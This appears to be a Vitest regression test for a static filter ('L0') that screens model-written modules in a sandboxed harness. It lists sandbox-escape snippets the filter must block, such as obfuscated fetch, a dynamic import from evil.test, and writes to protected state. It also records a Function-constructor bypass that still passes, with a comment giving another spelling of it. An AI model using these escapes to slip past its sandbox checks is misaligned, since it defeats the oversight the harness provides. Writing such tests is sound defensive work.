import { describe, it, expect } from 'vitest';
import { analyze } from '../../src/harness/l0-static.js';
import { makeIntent } from '../fixtures.js';

/**
 * Twelve escapes were written against L0 and twelve passed. This file is what stops
 * that number drifting back up: each case is an attack, and a regression here means
 * the cheap filter has stopped catching something it used to.
 *
 * These are NOT a security guarantee. L0 is a lint against a model that wandered; the
 * enforced boundary is `revokeCapabilities()` in the probe worker, which deletes the
 * capability rather than objecting to its name. An adversarial author still defeats
 * every check below — the point is that a *drifting model* does not.
 */
const intent = makeIntent({ scope: ['weather.rain'], allowedPrimitives: ['rain-emitter'] });
const blocked = (src: string): boolean => analyze(src, intent).length > 0;

describe('L0 · escapes that used to pass', () => {
  it.each([
    ['computed global access', `const g = globalThis['fe'+'tch']; g('https://x.test');`],
    ['aliased global', `const s = self; s.postMessage(1);`],
    ['dynamic import', `const m = await import('https://evil.test/x.js');`],
    ['computed state write', `const k = 'camera'; __VERBO_STATE__[k].position = [0,0,0];`],
    ['aliased state root', `const s = __VERBO_STATE__; s.camera = {};`],
    ['computed register path', `const p = 'terrain.' + 'height'; world.register(i, p);`],
    ['globalThis assignment', `globalThis.__VERBO_PRIMITIVES__ = {};`],
    ['postMessage', `self.postMessage({ ok: true });`],
  ])('rejects %s', (_name, src) => {
    expect(blocked(src)).toBe(true);
  });

  it('still admits an ordinary module', () => {
    const ok = `import emitter from 'verbo:rain-emitter';
export function mount(world) {
  const inst = emitter.mount(world, { particles: 4000 });
  __VERBO_STATE__.weather.rain.particles = 4000;
  return [{ instance: inst, statePath: 'weather.rain' }];
}`;
    expect(analyze(ok, intent)).toEqual([]);
  });
});

describe('L0 · what it does not claim to stop', () => {
  it('an indirect Function constructor still passes — and that is why the worker revokes', () => {
    // Kept as a test rather than fixed, because fixing it in the AST is whack-a-mole:
    // the next spelling is `[]['constructor']['constructor']`. The boundary that holds
    // is deletion in the worker, not detection here.
    expect(blocked(`const F = (()=>{}).constructor; F('return 1')();`)).toBe(false);
  });
});
